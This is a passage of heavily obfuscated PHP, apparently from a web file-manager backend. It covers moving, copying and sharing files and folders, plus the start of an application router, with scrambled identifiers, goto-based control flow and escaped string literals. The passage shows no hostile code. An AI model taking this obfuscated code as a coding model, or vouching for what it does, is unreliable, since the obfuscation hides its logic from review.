($cØéÈŒœÙ‹ == strtolower($E®ïÇÔĞÌà[$C®ºÛÈªÁ†[28]])) { return $E®ïÇÔĞÌà[$C®ºÛÈªÁ†[374]]; } } return !1; } private function fileNameAutoCache($aŸ’Íôã±Í, $AÕò”ÉöÌù, $d¯æ¶‘¹‡, $aË õ¿È¯) { $CÁ÷š«µëó =& $_SERVER[İåâé¾]; $D©‹ÖªÜ½ = $this->_childrenList($aŸ’Íôã±Í); $Eå·„—ôÛ = array_to_keyvalue($D©‹ÖªÜ½, $CÁ÷š«µëó[33], $CÁ÷š«µëó[28]); return $this->fileNameAutoGet($Eå·„—ôÛ, $AÕò”ÉöÌù, $d¯æ¶‘¹‡, $aË õ¿È¯); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e¤Õß½Ê³Ø, $cŞÆÆ‡ë¬å, $FˆŒ³áôğ– = REPEAT_REPLACE, $EòÂÈáğ¿™ = '') { goto C½‘Å¶ÂÔØ; fŒæ™Â»Ì: $this->folderSizeReset($cŞÆÆ‡ë¬å); $FÛä°é•­Æ = array($FóÀ»·¦[$F‰Úö›ùÚ[384]], $cŞÆÆ‡ë¬å); if ($FóÀ»·¦[$F‰Úö›ùÚ[375]] == $F‰Úö›ùÚ[376]) { $FÛä°é•­Æ[] = $e¤Õß½Ê³Ø; } goto A‡ƒ˜ ˜; A‡ƒ˜ ˜: $this->updateModifyTime($FÛä°é•­Æ); Model($F‰Úö›ùÚ[381])->eventMove($e¤Õß½Ê³Ø, $FóÀ»·¦[$F‰Úö›ùÚ[384]], $cŞÆÆ‡ë¬å); return $E‚¯¾³¢; goto aÍ’ğŞÒª¢; C½‘Å¶ÂÔØ: $F‰Úö›ùÚ =& $_SERVER[İåâé¾]; $FóÀ»·¦ = $this->sourceInfo($e¤Õß½Ê³Ø); $dêÃÔŒ™‹¾ = $this->sourceInfo($cŞÆÆ‡ë¬å); goto Dä İÙÑ„®; cèŒÇô«Ùğ: $E‚¯¾³¢ = $this->_move($e¤Õß½Ê³Ø, $cŞÆÆ‡ë¬å, $FˆŒ³áôğ–, $eŒÁ®¶–, $EòÂÈáğ¿™); $this->sourceCacheClear(); if ($FóÀ»·¦[$F‰Úö›ùÚ[375]] == $F‰Úö›ùÚ[376] && $B¿±‘˜êË) { $this->folderSizeResetChildren($E‚¯¾³¢); } goto d«ñâ‰è¡¶; Dä İÙÑ„®: if ($this->isParentOf($e¤Õß½Ê³Ø, $cŞÆÆ‡ë¬å)) { return !1; } if (!$FóÀ»·¦ || !$dêÃÔŒ™‹¾ || $dêÃÔŒ™‹¾[$F‰Úö›ùÚ[375]] != $F‰Úö›ùÚ[376]) { return !1; } if ($FóÀ»·¦[$F‰Úö›ùÚ[384]] == $cŞÆÆ‡ë¬å && $EòÂÈáğ¿™ != $FóÀ»·¦[$F‰Úö›ùÚ[28]]) { $DÈ„Ó©Åùæ = $this->fileNameExist($cŞÆÆ‡ë¬å, $EòÂÈáğ¿™); if ($DÈ„Ó©Åùæ && $FóÀ»·¦[$F‰Úö›ùÚ[375]] == $F‰Úö›ùÚ[402]) { $D«ÎíÆÒÁ = $this->sourceInfo($DÈ„Ó©Åùæ); $bôÉØáâæ½ = $this->fileHistory($D«ÎíÆÒÁ, $FóÀ»·¦[$F‰Úö›ùÚ[382]], $FóÀ»·¦[$F‰Úö›ùÚ[78]]); if (!$bôÉØáâæ½) { Model($F‰Úö›ùÚ[411])->remove($FóÀ»·¦[$F‰Úö›ùÚ[382]]); } $this->remove($e¤Õß½Ê³Ø, !1); $this->folderSizeReset($cŞÆÆ‡ë¬å); return $DÈ„Ó©Åùæ; } } goto e´«µ‰¬‰ª; e´«µ‰¬‰ª: $eŒÁ®¶– = array($F‰Úö›ùÚ[377] => array(), $F‰Úö›ùÚ[412] => !1); $this->clearShare($e¤Õß½Ê³Ø, $cŞÆÆ‡ë¬å); $B¿±‘˜êË = $this->fileNameExistCache($cŞÆÆ‡ë¬å, $FóÀ»·¦[$F‰Úö›ùÚ[28]]); goto cèŒÇô«Ùğ; d«ñâ‰è¡¶: Model($F‰Úö›ùÚ[163])->linkAdd($eŒÁ®¶–[$F‰Úö›ùÚ[377]]); if ($B¿±‘˜êË && $eŒÁ®¶–[$F‰Úö›ùÚ[412]]) { $this->remove($e¤Õß½Ê³Ø, !1); } $this->folderSizeReset($FóÀ»·¦[$F‰Úö›ùÚ[384]]); goto fŒæ™Â»Ì; aÍ’ğŞÒª¢: } private function _move($D°‘‘‰ğ„’, $CÂ¤‡‡ªè, $B‡×õóóªâ, &$EÌØ¾È‡†ğ, $EÎ›í··ƒ = '') { goto dÛ•±ÍºÂ; c¨Ñ‚ã×Ö¾: if ($e·Ø÷„İÒ• && !$EÌØ¾È‡†ğ[$fÆÁÉÎŒ¦è[412]]) { $EÌØ¾È‡†ğ[$fÆÁÉÎŒ¦è[412]] = !0; } return $c³Ãòß¥¦¬; goto e£·ª®©›­; dÛ•±ÍºÂ: $fÆÁÉÎŒ¦è =& $_SERVER[İåâé¾]; $cÌ´ƒ´‚… = $this->sourceInfo($D°‘‘‰ğ„’); $d³š‹Ìáô† = $cÌ´ƒ´‚…[$fÆÁÉÎŒ¦è[375]] == $fÆÁÉÎŒ¦è[376]; goto fÊ¼é“”İà; fÊ¼é“”İà: $EŒšµ¤’„Ï = $EÎ›í··ƒ ? $EÎ›í··ƒ : $cÌ´ƒ´‚…[$fÆÁÉÎŒ¦è[28]]; $FÓ“‰’ñÉ = $this->fileNameExistCache($CÂ¤‡‡ªè, $EŒšµ¤’„Ï); if (!$FÓ“‰’ñÉ) { return $this->_moveForce($D°‘‘‰ğ„’, $CÂ¤‡‡ªè, $EŒšµ¤’„Ï); } goto a°¤¬å‡˜; a°¤¬å‡˜: $c³Ãòß¥¦¬ = $FÓ“‰’ñÉ; $e·Ø÷„İÒ• = !1; if ($d³š‹Ìáô†) { if ($B‡×õóóªâ == REPEAT_RENAME_FOLDER) { $EŒšµ¤’„Ï = $this->fileNameAuto($CÂ¤‡‡ªè, $EŒšµ¤’„Ï, $B‡×õóóªâ, $d³š‹Ìáô†); $c³Ãòß¥¦¬ = $this->_moveForce($D°‘‘‰ğ„’, $CÂ¤‡‡ªè, $EŒšµ¤’„Ï); } else { if ($B‡×õóóªâ == REPEAT_RENAME_FOLDER) { $B‡×õóóªâ = REPEAT_RENAME; } $Fóø„Ó×Ó¼ = $this->_childrenListSelect($D°‘‘‰ğ„’); foreach ($Fóø„Ó×Ó¼ as $CĞ¤¨»Ã¢¿) { $this->_move($CĞ¤¨»Ã¢¿[$fÆÁÉÎŒ¦è[374]], $FÓ“‰’ñÉ, $B‡×õóóªâ, $EÌØ¾È‡†ğ); } $e·Ø÷„İÒ• = !0; } } else { if ($B‡×õóóªâ == REPEAT_SKIP) { $e·Ø÷„İÒ• = !0; } else { if ($B‡×õóóªâ == REPEAT_RENAME || $B‡×õóóªâ == REPEAT_RENAME_FOLDER) { $EŒšµ¤’„Ï = $this->fileNameAuto($CÂ¤‡‡ªè, $EŒšµ¤’„Ï, $B‡×õóóªâ, $d³š‹Ìáô†); $c³Ãòß¥¦¬ = $this->_moveForce($D°‘‘‰ğ„’, $CÂ¤‡‡ªè, $EŒšµ¤’„Ï); } else { if ($B‡×õóóªâ == REPEAT_REPLACE) { $AÃó·ÏÀ¸¹ = $this->sourceInfoCache($FÓ“‰’ñÉ); $Bä›£Åï“¡ = $this->fileHistory($AÃó·ÏÀ¸¹, $cÌ´ƒ´‚…[$fÆÁÉÎŒ¦è[382]], $cÌ´ƒ´‚…[$fÆÁÉÎŒ¦è[78]]); if ($Bä›£Åï“¡) { $EÌØ¾È‡†ğ[$fÆÁÉÎŒ¦è[377]][] = $cÌ´ƒ´‚…[$fÆÁÉÎŒ¦è[382]]; } else { $e·Ø÷„İÒ• = !0; } } } } } goto c¨Ñ‚ã×Ö¾; e£·ª®©›­: } private function _moveForce($a®øİ¸šˆˆ, $c¼Öƒõ£Ñ, $d“øÙÅ‰Í) { goto bø³ø‰“î½; d³´ùŸŒÙï: if (!$CÑ”·Ìáƒª) { Model($c‡æ·¾æ‹‰[413])->authClear($a®øİ¸šˆˆ); } if ($dØÃ—¿ã¡ã) { $bìË÷æ½¸ = array($c‡æ·¾æ‹‰[399] => array($c‡æ·¾æ‹‰[408], $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[373]] . $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[374]] . $c‡æ·¾æ‹‰[409])); $EÌÆÉÃ®Æµ = $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[373]] . $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[374]] . $c‡æ·¾æ‹‰[47]; $BİÀ’‰ÏÀ· = $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[373]] . $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[374]] . $c‡æ·¾æ‹‰[47] . $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[374]] . $c‡æ·¾æ‹‰[47]; $DÔÂÓÃÅÛí = array($c‡æ·¾æ‹‰[399] => array($c‡æ·¾æ‹‰[414], "\162\145\x70\154\141\x63\145\50\160\141\x72\x65\156\x74\x4c\145\166\145\x6c\x2c\x27{$EÌÆÉÃ®Æµ}\47\54\x27{$BİÀ’‰ÏÀ·}\x27\51"), $c‡æ·¾æ‹‰[392] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[393]], $c‡æ·¾æ‹‰[394] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[395]], $c‡æ·¾æ‹‰[400] => 0); $this->where($bìË÷æ½¸)->data($DÔÂÓÃÅÛí)->save(); } $this->where(array($c‡æ·¾æ‹‰[415] => $a®øİ¸šˆˆ))->data($F“¾ğÅ¾ã)->save(); goto d¦‰èéß¢; d¦‰èéß¢: return $a®øİ¸šˆˆ; goto aŸå§ÛåáÜ; bø³ø‰“î½: $c‡æ·¾æ‹‰ =& $_SERVER[İåâé¾]; $DèâÑøÖÕ² = $this->sourceInfo($a®øİ¸šˆˆ); $F¼ºª©ÜÎ = $this->sourceInfo($c¼Öƒõ£Ñ); goto c¿¹‚ºõ; c¿¹‚ºõ: $dØÃ—¿ã¡ã = $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[375]] == $c‡æ·¾æ‹‰[376]; $F“¾ğÅ¾ã = array($c‡æ·¾æ‹‰[398] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[374]], $c‡æ·¾æ‹‰[399] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[373]] . $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[374]] . $c‡æ·¾æ‹‰[47], $c‡æ·¾æ‹‰[392] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[393]], $c‡æ·¾æ‹‰[394] => $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[395]], $c‡æ·¾æ‹‰[397] => USER_ID, $c‡æ·¾æ‹‰[400] => 0, $c‡æ·¾æ‹‰[387] => $d“øÙÅ‰Í); $CÑ”·Ìáƒª = $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[393]] == SourceModel::TYPE_GROUP && $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[393]] == SourceModel::TYPE_GROUP && $DèâÑøÖÕ²[$c‡æ·¾æ‹‰[395]] == $F¼ºª©ÜÎ[$c‡æ·¾æ‹‰[395]]; goto d³´ùŸŒÙï; aŸå§ÛåáÜ: } private function clearShare($d­¨¹ªùÖ•, $FÀ¡°ÆŞ¶Ï) { goto Bİ£¯êµğƒ; EÂêÊ§Œ„: if (!$d‚÷»ŸÌ¬) { return; } $Dî™ñ¿´éø = array($fïÙ¢ó¨[374] => array($fïÙ¢ó¨[7], $d‚÷»ŸÌ¬), $fïÙ¢ó¨[417] => 1); $e†ãôõ‚Œù = Model($fïÙ¢ó¨[418])->field($fïÙ¢ó¨[419])->where($Dî™ñ¿´éø)->select(); goto f°¯ÎŸîô; Bİ£¯êµğƒ: $fïÙ¢ó¨ =& $_SERVER[İåâé¾]; $Dš•İĞ³„œ = $this->sourceInfo($d­¨¹ªùÖ•); $F›‹ˆ¯¯Ü = $this->sourceInfo($FÀ¡°ÆŞ¶Ï); goto F¬„ÕÛ¤É; f°¯ÎŸîô: if (!$e†ãôõ‚Œù) { return; } $e†ãôõ‚Œù = array_to_keyvalue($e†ãôõ‚Œù, $fïÙ¢ó¨[33], $fïÙ¢ó¨[419]); $Dî™ñ¿´éø = array($fïÙ¢ó¨[419] => array($fïÙ¢ó¨[7], $e†ãôõ‚Œù)); goto dË‰¬É¾¬„; dË‰¬É¾¬„: Model($fïÙ¢ó¨[418])->where($Dî™ñ¿´éø)->save(array($fïÙ¢ó¨[417] => 0)); Model($fïÙ¢ó¨[420])->where($Dî™ñ¿´éø)->delete(); goto d¢ğÛ¹ÉØ; F¬„ÕÛ¤É: if ($Dš•İĞ³„œ[$fïÙ¢ó¨[395]] == $F›‹ˆ¯¯Ü[$fïÙ¢ó¨[395]] && $Dš•İĞ³„œ[$fïÙ¢ó¨[393]] == $fïÙ¢ó¨[416]) { return; } $Dî™ñ¿´éø = array($fïÙ¢ó¨[373] => array($fïÙ¢ó¨[408], $Dš•İĞ³„œ[$fïÙ¢ó¨[373]] . $d­¨¹ªùÖ• . $fïÙ¢ó¨[409]), $fïÙ¢ó¨[410] => 0); $d‚÷»ŸÌ¬ = $this->field($fïÙ¢ó¨[415])->where($Dî™ñ¿´éø)->getField($fïÙ¢ó¨[374], !0); goto EÂêÊ§Œ„; d¢ğÛ¹ÉØ: } public function copyFolderFromIO($d£ £è»ì, $Aİ‘ŒºÆ‚Ë, $d“¿ØœèÀë, $BòèŞíĞ¥, $f•ÓÁè©ğ·) { goto D…öóêòÊí; aÓ®¾œÍ™„: Hook::trigger($EØÈè¬¾ÖÇ[423]); if ($fîÆÑ²†¯—) { $this->folderSizeResetChildren($fîÆÑ²†¯—); } $this->_childrenListClear(); goto bùÎ½¦åœğ; D…öóêòÊí: $EØÈè¬¾ÖÇ =& $_SERVER[İåâé¾]; $dó‡‰Ê†™± = array($EØÈè¬¾ÖÇ[378] => array(), $EØÈè¬¾ÖÇ[379] => array(), $EØÈè¬¾ÖÇ[377] => array(), $EØÈè¬¾ÖÇ[421] => array()); $DŠó§âÉÔ¥ = $d£ £è»ì->getPathName($d£ £è»ì->pathThis($Aİ‘ŒºÆ‚Ë)); goto Dğ‰áˆ‰»Ñ; Dğ‰áˆ‰»Ñ: $DˆäŸÀº = $this->fileNameExist($d“¿ØœèÀë, $DŠó§âÉÔ¥); $fîÆÑ²†¯— = $this->mkdir($d“¿ØœèÀë, $DŠó§âÉÔ¥, $BòèŞíĞ¥); if (!$DˆäŸÀº || $BòèŞíĞ¥ == REPEAT_RENAME_FOLDER) { $BòèŞíĞ¥ = !1; } goto cî®öÅ¸Á; aˆ”¦¥¼Ğƒ: $this->updateModifyTime($d“¿ØœèÀë); return $fîÆÑ²†¯—; goto dòØ¼ì­¶À; cî®öÅ¸Á: if ($DˆäŸÀº) { $this->_childrenAllMake($DˆäŸÀº); } Hook::trigger($EØÈè¬¾ÖÇ[422]); $this->_copyChildTo($d£ £è»ì, $Aİ‘ŒºÆ‚Ë, $fîÆÑ²†¯—, $BòèŞíĞ¥, $dó‡‰Ê†™±, $f•ÓÁè©ğ·); goto aÓ®¾œÍ™„; fƒó—Ğ«¥‹: Model($EØÈè¬¾ÖÇ[411])->linkAdd($dó‡‰Ê†™±[$EØÈè¬¾ÖÇ[377]]); Model($EØÈè¬¾ÖÇ[411])->remove($dó‡‰Ê†™±[$EØÈè¬¾ÖÇ[421]]); $this->folderSizeReset($d“¿ØœèÀë); goto aˆ”¦¥¼Ğƒ; bùÎ½¦åœğ: Model($EØÈè¬¾ÖÇ[380])->addAll($dó‡‰Ê†™±[$EØÈè¬¾ÖÇ[378]], array(), !0); Model($EØÈè¬¾ÖÇ[381])->eventCopy($fîÆÑ²†¯—); $this->saveAll($dó‡‰Ê†™±[$EØÈè¬¾ÖÇ[379]]); goto fƒó—Ğ«¥‹; dòØ¼ì­¶À: } private function _copyChildTo($B±¦„Ñ´ˆâ, $d¶”®„ÀÓ, $b½…Œ¨ò–, $fÏ‚«¶ÏÚ, &$b¿ÒŞø±ŒÙ, $D»Âã¶Öµ³) { goto Fã—Àó“„í; AÄ—ƒÇÁæ: $eÑî¤¿Áæ = $this->_childrenList($b½…Œ¨ò–); $eÑî¤¿Áæ = array_to_keyvalue($eÑî¤¿Áæ, $B“á²èó—ø[28]); foreach ($DÓ¶éß”ôÙ as $dôìƒÚ‰¢) { $a¼ôïìòÓÚ = $eÑî¤¿Áæ[$dôìƒÚ‰¢[$B“á²èó—ø[28]]]; $Bè®‚ÔòÉŸ = $a¼ôïìòÓÚ[$B“á²èó—ø[374]]; $this->_copyApplyMeta($a¼ôïìòÓÚ, $b¿ÒŞø±ŒÙ); if ($dôìƒÚ‰¢[$B“á²èó—ø[29]] == $B“á²èó—ø[77]) { $dôìƒÚ‰¢[$B“á²èó—ø[76]] = $B±¦„Ñ´ˆâ->getPathInner($dôìƒÚ‰¢[$B“á²èó—ø[76]]); $this->_copyChildTo($B±¦„Ñ´ˆâ, $dôìƒÚ‰¢[$B“á²èó—ø[76]], $Bè®‚ÔòÉŸ, $fÏ‚«¶ÏÚ, $b¿ÒŞø±ŒÙ, $D»Âã¶Öµ³); } } goto E¿ö¾Ãåíå; a‹µÛĞªïÇ: foreach ($DÓ¶éß”ôÙ as &$dôìƒÚ‰¢) { goto cÛ¥³‹¤Ü¯; C‘Œ‹ è¾: if ($fÏ‚«¶ÏÚ) { $B¬—ğß«ˆÏ = $this->fileNameExistCache($b½…Œ¨ò–, $dôìƒÚ‰¢[$B“á²èó—ø[28]]); if ($B¬—ğß«ˆÏ) { if ($dôìƒÚ‰¢[$B“á²èó—ø[375]] || $fÏ‚«¶ÏÚ == REPEAT_SKIP) { continue; } if ($fÏ‚«¶ÏÚ == REPEAT_REPLACE) { $a¼ôïìòÓÚ = $this->sourceInfoCache($B¬—ğß«ˆÏ); $AÛõŸÚàğ« = $this->fileHistory($a¼ôïìòÓÚ, $dôìƒÚ‰¢[$B“á²èó—ø[382]], $dôìƒÚ‰¢[$B“á²èó—ø[78]]); if ($AÛõŸÚàğ«) { $b¿ÒŞø±ŒÙ[$B“á²èó—ø[377]][] = $dôìƒÚ‰¢[$B“á²èó—ø[382]]; } continue; } else { if ($fÏ‚«¶ÏÚ == REPEAT_RENAME) { $dôìƒÚ‰¢[$B“á²èó—ø[28]] = $this->fileNameAutoCache($b½…Œ¨ò–, $dôìƒÚ‰¢[$B“á²èó—ø[28]], $fÏ‚«¶ÏÚ, !1); } } } } if (!$dôìƒÚ‰¢[$B“á²èó—ø[375]] && $dôìƒÚ‰¢[$B“á²èó—ø[382]]) { $b¿ÒŞø±ŒÙ[$B“á²èó—ø[377]][] = $dôìƒÚ‰¢[$B“á²èó—ø[382]]; } $AÏÈ‚šøÁ´[] = $this->_makeItemData($dôìƒÚ‰¢, $dó‰¬•Û ÷, $dôìƒÚ‰¢[$B“á²èó—ø[28]]); goto EÌˆ¡Ó·¼•; cÛ¥³‹¤Ü¯: if (isset($d¤¾¶¿—·[$dôìƒÚ‰¢[$B“á²èó—ø[28]]])) { $dôìƒÚ‰¢ = $d¤¾¶¿—·[$dôìƒÚ‰¢[$B“á²èó—ø[28]]]; } $dôìƒÚ‰¢[$B“á²èó—ø[375]] = $dôìƒÚ‰¢[$B“á²èó—ø[29]] == $B“á²èó—ø[77]; $dôìƒÚ‰¢[$B“á²èó—ø[389]] = _get($dôìƒÚ‰¢, $B“á²èó—ø[156], $B“á²èó—ø[33]); goto dİí“Ì×°; dİí“Ì×°: $dôìƒÚ‰¢[$B“á²èó—ø[78]] = _get($dôìƒÚ‰¢, $B“á²èó—ø[78], 0); $dôìƒÚ‰¢[$B“á²èó—ø[382]] = _get($dôìƒÚ‰¢, $B“á²èó—ø[382], 0); if (!isset($dôìƒÚ‰¢[$B“á²èó—ø[424]]) && $dôìƒÚ‰¢[$B“á²èó—ø[382]]) { $b¿ÒŞø±ŒÙ[$B“á²èó—ø[421]][] = $dôìƒÚ‰¢[$B“á²èó—ø[382]]; } goto C‘Œ‹ è¾; EÌˆ¡Ó·¼•: } unset($dôìƒÚ‰¢); if (!empty($AÏÈ‚šøÁ´)) { $this->addAll($AÏÈ‚šøÁ´); } goto AÄ—ƒÇÁæ; CÆ„·×òØ: $DÓ¶éß”ôÙ = array_merge($a´ŒÓ‘Ã°[$B“á²èó—ø[74]], $a´ŒÓ‘Ã°[$B“á²èó—ø[75]]); $d¤¾¶¿—· = $this->_addFiles($B±¦„Ñ´ˆâ, $a´ŒÓ‘Ã°[$B“á²èó—ø[74]], $D»Âã¶Öµ³); $AÏÈ‚šøÁ´ = array(); goto a‹µÛĞªïÇ; Fã—Àó“„í: $B“á²èó—ø =& $_SERVER[İåâé¾]; $dó‰¬•Û ÷ = $this->sourceInfoCache($b½…Œ¨ò–); $a´ŒÓ‘Ã° = $B±¦„Ñ´ˆâ->listPath($d¶”®„ÀÓ, !1, !0); goto CÆ„·×òØ; E¿ö¾Ãåíå: } private function _addFiles($FŸÔÃÉ°æê, $eàÓùœ‰Ìğ, $bã”ŠÜÕç†) { goto f¼ˆ·»ÕÛ²; cÒ‘©¾Æ: foreach ($eàÓùœ‰Ìğ as &$d¤‰ğÆ£) { goto FÉâê¹à¼; Fñê¡Áùª: $d¤‰ğÆ£[$e“İ¼¡ç†¬[159]] = $E¹‡µÚë‚; Hook::trigger($e“İ¼¡ç†¬[426], $d¤‰ğÆ£); $e·…Õ¸Š¯[$E¹‡µÚë‚][] =& $d¤‰ğÆ£; goto bìƒ¿ˆÉ‘; FÉâê¹à¼: Hook::trigger($e“İ¼¡ç†¬[425], $d¤‰ğÆ£); $d¤‰ğÆ£[$e“İ¼¡ç†¬[76]] = $FŸÔÃÉ°æê->getPathInner($d¤‰ğÆ£[$e“İ¼¡ç†¬[76]]); $fÛ‹¥‘•Š† = $FŸÔÃÉ°æê->hashSimple($d¤‰ğÆ£[$e“İ¼¡ç†¬[76]]); goto cÎğƒÇêÉÏ; bìƒ¿ˆÉ‘: if (count($e·…Õ¸Š¯[$E¹‡µÚë‚]) > 1) { $d¤‰ğÆ£[$e“İ¼¡ç†¬[424]] = !0; } goto Cœ“ÑÉ‰Æ; cÎğƒÇêÉÏ: $E¹‡µÚë‚ = $FŸÔÃÉ°æê->hashMd5($d¤‰ğÆ£[$e“İ¼¡ç†¬[76]]); if (strlen($E¹‡µÚë‚) > 10 && !isset($e·…Õ¸Š¯[$E¹‡µÚë‚])) { $e·…Õ¸Š¯[$E¹‡µÚë‚] = array(); } $d¤‰ğÆ£[$e“İ¼¡ç†¬[160]] = $fÛ‹¥‘•Š†; goto Fñê¡Áùª; Cœ“ÑÉ‰Æ: } $eéĞŠİ¶Àå = array($e“İ¼¡ç†¬[159] => array($e“İ¼¡ç†¬[7], array_keys($e·…Õ¸Š¯))); $aĞ£æÖÕ‹ = Model($e“İ¼¡ç†¬[427]); goto C…È“†¢ƒ£; A‚Ï°¨õÒ: foreach ($b®è©¬Êê‘ as $f¡ÊÍ‡æÍö) { if (!isset($e·…Õ¸Š¯[$f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[159]]])) { continue; } $Aî¦¾©¯ÌŞ =& $e·…Õ¸Š¯[$f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[159]]]; foreach ($Aî¦¾©¯ÌŞ as &$d¤‰ğÆ£) { $d¤‰ğÆ£[$e“İ¼¡ç†¬[382]] = $f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[382]]; } unset($d¤‰ğÆ£); } $Eƒ¹Š©ùˆÍ = array(); foreach ($eàÓùœ‰Ìğ as $b¸Æ§Û²®) { $Eƒ¹Š©ùˆÍ[$b¸Æ§Û²®[$e“İ¼¡ç†¬[28]]] = $b¸Æ§Û²®; } goto a¢†·äñÀ; a«İÍãĞ¡‹: $fÛ‰£İµó“ = array(); foreach ($eàÓùœ‰Ìğ as $dŞÃÁƒ£‚ç) { if (isset($dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[424]]) && $dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[424]]) { continue; } $aäâ–ŒÏí… = $FŸÔÃÉ°æê->getPathInner($dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[76]]); $D¥íï¦Éƒ£ = $aĞ£æÖÕ‹->addFileMake($aäâ–ŒÏí…, $dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[78]], $dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[160]], $dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[159]], $dŞÃÁƒ£‚ç[$e“İ¼¡ç†¬[28]], $bã”ŠÜÕç†); $fÛ‰£İµó“[] = $D¥íï¦Éƒ£; } $aĞ£æÖÕ‹->addAll($fÛ‰£İµó“); goto AµĞ³»ã‰È; f¼ˆ·»ÕÛ²: $e“İ¼¡ç†¬ =& $_SERVER[İåâé¾]; if (!$eàÓùœ‰Ìğ || count($eàÓùœ‰Ìğ) == 0) { return array(); } $e·…Õ¸Š¯ = array(); goto cÒ‘©¾Æ; AµĞ³»ã‰È: $eéĞŠİ¶Àå = array($e“İ¼¡ç†¬[159] => array($e“İ¼¡ç†¬[7], array_keys($e·…Õ¸Š¯))); $b®è©¬Êê‘ = $aĞ£æÖÕ‹->where($eéĞŠİ¶Àå)->select(); $b®è©¬Êê‘ = $b®è©¬Êê‘ ? $b®è©¬Êê‘ : array(); goto A‚Ï°¨õÒ; a¢†·äñÀ: return $Eƒ¹Š©ùˆÍ; goto b…ØÕ‹™Ú°; C…È“†¢ƒ£: $b®è©¬Êê‘ = $aĞ£æÖÕ‹->where($eéĞŠİ¶Àå)->select(); $b®è©¬Êê‘ = $b®è©¬Êê‘ ? $b®è©¬Êê‘ : array(); foreach ($b®è©¬Êê‘ as $f¡ÊÍ‡æÍö) { if (!isset($e·…Õ¸Š¯[$f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[159]]])) { continue; } $bçƒäÈ–Ñ = $e·…Õ¸Š¯[$f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[159]]]; foreach ($bçƒäÈ–Ñ as &$d¤‰ğÆ£) { $d¤‰ğÆ£[$e“İ¼¡ç†¬[382]] = $f¡ÊÍ‡æÍö[$e“İ¼¡ç†¬[382]]; $d¤‰ğÆ£[$e“İ¼¡ç†¬[424]] = !0; } unset($d¤‰ğÆ£); } goto a«İÍãĞ¡‹; b…ØÕ‹™Ú°: } } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\156\x64\145\x78"; private $defaultAction = "\x69\x6e\144\145\x78"; public function setDefault($b×œ¼‚·») { $a£Í‡¢ï‡‡ =& $_SERVER[İåâé¾]; $A‡ÖÅä® = explode($a£Í‡¢ï‡‡[90], trim($b×œ¼‚·», $a£Í‡¢ï‡‡[90])); $this->defaultModule = $A‡ÖÅä®[0] ? $A‡ÖÅä®[0] : $this->defaultModule; $this->defaultController = $A‡ÖÅä®[1] ? $A‡ÖÅä®[1] : $this->defaultController; $this->defaultAction = $A‡ÖÅä®[2] ? $A‡ÖÅä®[2] : $this->defaultAction; } public function appRun($B‰„„øÓÓ×) { goto Eï¬Õ”•Ç; f®œğ à: $EÍ¬Ğ‹ä¸ñ = $aäÅ¡¯Ë÷ô[428]; if ($dÔÌ–»æ’ == $aäÅ¡¯Ë÷ô[429]) { $EÍ¬Ğ‹ä¸ñ = $aäÅ¡¯Ë÷ô[430]; $B£Ì‰ˆĞĞ„[0] = $aäÅ¡¯Ë÷ô[33]; $B£Ì‰ˆĞĞ„[1] = $B£Ì‰ˆĞĞ„[1] . $aäÅ¡¯Ë÷ô[431]; $B‰„„øÓÓ× = join($aäÅ¡¯Ë÷ô[90], $B£Ì‰ˆĞĞ„); $B‰„„øÓÓ× = trim($B‰„„øÓÓ×, $aäÅ¡¯Ë÷ô[90]); } Hook::trigger($EÍ¬Ğ‹ä¸ñ . $aäÅ¡¯Ë÷ô[432], $B‰„„øÓÓ×); goto cÖ·±¦ôõ›; Eï¬Õ”•Ç: $aäÅ¡¯Ë÷ô =& $_SERVER[İåâé¾]; $B£Ì‰ˆĞĞ„ = explode($aäÅ¡¯Ë÷ô[90], $B‰„„øÓÓ×); $dÔÌ–»æ’ = strtolower($B£Ì‰ˆĞĞ„[0]); goto f®œğ à; cÖ·±¦ôõ›: ActionCall($B‰„„øÓÓ×); Hook::trigger($EÍ¬Ğ‹ä¸ñ . $aäÅ¡¯Ë÷ô[433], $B‰„„øÓÓ×); goto A‘ÒµÙ¢Æ±; A‘ÒµÙ¢Æ±: } private function autorun() { $eí©„³æ†õ =& $_SERVER[İåâé¾]; global $config; if (count($config[$eí©„³æ†õ[434]]) == 0) { return; } foreach ($config[$eí©„³æ†õ[434]] as $EÀ²†ÔøÙš => $C ‚Æ ËÏÄ) { $this->appRun($C ‚Æ ËÏÄ); } } private function parsePluginRoute() { goto EÁíµÀ³„; EÁíµÀ³„: $aĞ¾¥Ô¢ó =& $_SERVER[İåâé¾]; $a†Ğƒà„œ‚ = $aĞ¾¥Ô¢ó[429]; $A°‡ÉœîÇ× = $GLOBALS[$aĞ¾¥Ô¢ó[7]][$aĞ¾¥Ô¢ó[435]][0]; goto Bäöì‡åŠ; CÌ©Ó‡‚È: $AÕÀ †ù®Æ = array($aĞ¾¥Ô¢ó[429], $e‰‹‹½çË); $A°éµñï— = 